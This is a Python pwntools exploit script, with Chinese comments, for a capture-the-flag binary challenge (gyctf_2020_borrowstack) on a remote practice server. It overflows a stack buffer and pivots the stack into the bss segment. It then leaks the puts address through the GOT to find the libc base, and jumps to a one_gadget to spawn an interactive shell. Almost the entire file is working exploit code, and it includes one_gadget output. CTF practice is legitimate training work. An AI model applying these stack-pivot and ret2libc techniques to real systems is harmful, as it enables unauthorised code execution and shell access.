from pwn import *

r = remote('node5.buuoj.cn', 29356)
elf = ELF(r'../../pwn_file/gyctf_2020_borrowstack')
libc = ELF(r'../libc/ubuntu-16.4-libc-2.23.so')
# r = process(r'./gyctf_2020_borrowstack')

context.log_level = 'debug'

# bss地址：0x601000～0x602000 rw-p
bss_addr = 0x601080
leave_ret = 0x400699
pop_rdi = 0x400703
ret_addr = 0x4004c9
read_addr = 0x400680  # 有第二次机会输入任意数据到 bank 缓冲区（比如再次输入 ROP 链或 shellcode）。
main_addr = elf.sym['main']  # 0x400626
puts_got = elf.got['puts']
puts_plt = elf.plt['puts']

print(f"main_addr: {str(hex(main_addr))}")
print(f"puts_got: {str(hex(puts_got))}")
print(f"puts_plt: {str(hex(puts_plt))}")

#gdb.attach(r)

# 开辟bss空间并指向read函数
payload = b'A' * 0x60 + p64(bss_addr + 0x90) + p64(leave_ret)
r.recvuntil(b'you want')
r.send(payload)
r.recvuntil(b'stack now!')

# 泄漏puts地址用于构造ROP
# p64(bss_addr + 0x60) 是为了下一次栈迁移的 rbp预留，可让你多次迁移、分阶段利用。每次迁移的 rbp 必须比上一次小，才能保证数据在 bss 段连续布置并可控。
#            填充至输入点        预设下一次rbp的位置     参数入栈          要泄漏的puts地址               返回main函数中的rad函数再次打下一个payload
puts_payload = b'B' * 0x90 + p64(bss_addr + 0x60) + p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(read_addr)
r.sendline(puts_payload)
r.recvline()
# puts_addr = u64(r.recvuntil('\x7f')[:-1].ljust(8, b'\x00'))  # 0x32f47b0690
# puts_addr = u64(r.recv(6)[:].ljust(8, b'\x00'))  # 0x7f73425f6690
'''
从 socket 接收数据，直到遇到第一个 \x7f（即泄漏地址的最高字节，x64 libc 地址通常以 0x7f 结尾），这样能确保拿到完整的 puts 地址输出
[:-6] 因为 Linux 下 x64 地址（如 libc 地址）只泄漏低 6 字节（高字节是 0），GOT 表中的函数地址实际只用到 6 字节
'''
puts_addr = u64(r.recvuntil(b'\x7f')[-6:].ljust(8, b'\x00'))  # 0x7f74de2fd690
print(f"puts_addr: {str(hex(puts_addr))}")

# 因为返回到read函数了，直接构造payload发送即可
libc_base = puts_addr - libc.sym['puts']
print(f"base_addr: {str(hex(libc_base))}")

# system_addr = libc_base + libc.sym['system']
# sh_addr = libc_base + libc.search(b'/bin/sh').__next__()

# #system函数需要的栈空间很大，因此第一个payload无法使用
# system_payload = b'C' * 0x60 + p64(ret_addr) + p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
'''
└─$ one_gadget ubuntu-16.4-libc-2.23.so 
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''
one_gadget = libc_base + 0xf1147  # 0xf02a4 也可以
# 因为这个栈已经是最后一个栈，所以不需要关心 ebp 的值，给它赋值 0x0 ,或者直接 b'C'*(0x60+8)覆盖
system_payload = b'C' * 0x60 + p64(0) + p64(one_gadget)
r.sendline(system_payload)
r.interactive()
